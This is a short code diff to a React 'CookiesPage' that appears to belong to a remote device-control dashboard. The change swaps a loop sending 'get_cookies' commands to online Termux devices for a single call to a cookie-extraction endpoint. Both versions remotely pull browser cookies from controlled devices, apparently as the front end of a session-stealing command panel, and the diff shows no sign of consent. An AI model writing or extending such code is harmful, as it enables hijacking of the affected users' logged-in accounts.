@@ -60,18 +60,11 @@ export default function CookiesPage() {
   const triggerExtract = async () => {
     setExtracting(true);
     try {
-      const devRes = await fetch("/api/termux/devices");
-      const devData = await devRes.json();
-      const devices = devData.devices || [];
-      for (const d of devices) {
-        if (d.status === "online") {
-          await fetch("/api/termux/commands", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ deviceId: d.deviceId, commands: [{ type: "get_cookies" }] }),
-          });
-        }
-      }
+      await fetch("/api/device-control/cookies/extract", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({}),
+      });
     } catch {}
     setTimeout(() => {
       setExtracting(false);
